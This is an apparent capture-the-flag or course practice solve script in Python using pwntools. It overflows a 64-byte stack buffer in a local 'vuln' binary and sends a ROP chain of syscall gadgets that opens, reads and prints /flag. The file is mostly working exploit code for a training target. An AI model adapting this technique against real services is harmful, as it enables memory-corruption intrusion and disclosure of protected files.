#!/usr/bin/env python3

import pwn
import socket
import threading

# docker compose -f debug.yml up
# python3 ./solve.py
# docker exec -ti "$(docker ps -q -f 'ancestor=softsec/debug/practice-2')" /bin/bash -c 'gdb -p "$(pgrep -n vuln)"'

pwn.context.arch = 'amd64'


exe = pwn.ELF("./vuln")
libc = pwn.ELF("./libc.so.6")

port = 1024
conn = pwn.remote('127.0.0.1', port)

# wait for user input (in this time, connect gdb)
pwn.pause()

# we gadgets :)

# we have a trivial buffer overflow. there is a 64 byte buffer, we can write arbitrary many chars
# => simply write ropchain

#objdump -I intel -D vuln
gadget_mov_rdi_rax  = 0x0000000000401000
gadget_pop_rdi      = 0x0000000000401004
gadget_syscall      = 0x0000000000401006
gadget_pop_rax      = 0x0000000000401009
gadget_pop_rsi      = 0x000000000040100b
gadget_pop_rdx      = 0x000000000040100d

address_flag_string = 0x0000000000402000
address_flag_buffer = 0x0000000000402008

# there is no string "/bin/sh" or push or lea
# we need to use the flag_buffer
"""
    # fd_flag = open("/flag", O_RDONLY)
    mov rdi, 0x0000000000402000;
    mov rsi, 0;
    mov rax, 2;
    syscall;

    # read fd_flag into flag_buffer
    mov rdi, rax;
    mov rax, 0;
    mov rsi, 0x0000000000402008;
    mov rdx, 100;       
    syscall;

    # write flag_buffer to stdout
    mov rax, 1;
    mov rdi, 1;
    mov rsi, 0x0000000000402008;
    mov rdx, 100;
    syscall;
"""

ropchain = [
    gadget_pop_rdi,
    address_flag_string,
    gadget_pop_rsi,
    0x0,
    gadget_pop_rax,
    0x2,
    gadget_syscall,

    gadget_mov_rdi_rax,
    gadget_pop_rax,
    0x0,
    gadget_pop_rsi,
    address_flag_buffer,
    gadget_pop_rdx,
    100,
    gadget_syscall,

    gadget_pop_rax,
    1,
    gadget_pop_rdi,
    1,
    gadget_pop_rsi,
    address_flag_buffer,
    gadget_pop_rdx,
    100,
    gadget_syscall
]

ropchain = b''.join([pwn.p64(i) for i in ropchain])
print(ropchain.hex())
conn.sendline(b'A'*72+ ropchain)

conn.interactive()
